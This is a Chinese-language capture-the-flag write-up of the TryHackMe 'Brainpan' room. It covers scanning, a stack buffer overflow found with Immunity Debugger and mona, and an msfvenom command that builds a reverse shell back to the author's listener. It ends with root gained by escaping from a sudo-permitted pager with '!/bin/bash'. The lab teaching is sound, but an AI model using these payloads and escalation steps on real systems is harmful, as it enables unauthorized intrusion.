# Brianpan

rainpan非常适合OSCP练习，强烈建议在考试前完成。通过分析 Linux 计算机上可切割的 Windows exe 来利用缓冲区溢出漏洞。如果你被困在这台机器上，不要放弃（或看写），只要更加努力。

---

这是一个定位难度：难 的房间，不过经过前面的缓冲区溢出练习，相信也不会有什么大问题

循例，nmap扫

    9999/tcp  open  abyss
    10000/tcp open  snet-sensor-mgmt

nc都连一下，10000端口是web服务，9999不知道是什么东西，不过按照以往经验，这玩意铁定存在栈溢出漏洞

既然开了web，我们循例也扫一下目录，因为主页就一张图片啥也没了

    gobuster dir --url http://10.10.84.134:10000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

扫出一个/bin，并且里面有个brianpan.exe,很好，要的就是它

下载之后，我们再次借助https://tryhackme.com/room/bufferoverflowprep 这个房间的win靶机帮助我们利用缓冲区溢出（第三次借用了🤣）

从Immunity Debugger中打开并运行brianpan.exe

    !mona config -set workingfolder c:\mona\%p

然后fuzz一波

    Fuzzing crashed at 600 bytes

在600字节上下崩了，我们生成700长度随机数据然后查找return addr

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700

    !mona findmsp -distance

结果：

    EIP contains normal pattern : 0x35724134 (offset 524)

### 控制EIP (return address)

我们填充524字节随机数据后，在后面再填充四字节 “BBBB”

成功覆盖EIP，此处就是return addr

### 找坏字符

生成\x00-\xff的字符集，将其追加到EIP后面

然后使用mona生成字节数组：

    !mona bytearray -b "\x00"

    !mona compare -f C:\mona\brainpan\bytearray.bin -a <esp_addr>

貌似没有坏字符，除了\x00 ，很幸运

### 寻找jmp esp指令地址

    !mona jmp -r esp -cpb "\x00"

小端序，将地址倒转

    311712F3 -> \xf3\x12\x17\x31

将地址覆盖掉return address即EIP

### 生成shellcode

题目开头那句话告诉我们这是linux机器

    msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.14.39.48 LPORT=8888 EXITFUNC=thread -b "\x00" -f c

将shellcode追加进return address的后面

我们可以在shellcode前面加一点

    \x90 * 16 或更多

nc开启监听，运行脚本，成功getshell

### 权限提升

升级shell

    python3 -c "import pty;pty.spawn('/bin/bash')"

看到sudo -l

    User puck may run the following commands on this host:
        (root) NOPASSWD: /home/anansi/bin/anansi_util

尝试了几次

    sudo /home/anansi/bin/anansi_util manual whoami
    whoami

进到了类似man这样的页面，随手一个：

    !/bin/bash

成功getroot，哈哈哈

<pre>root@brainpan:/usr/share/man# whoami
whoami
root</pre>


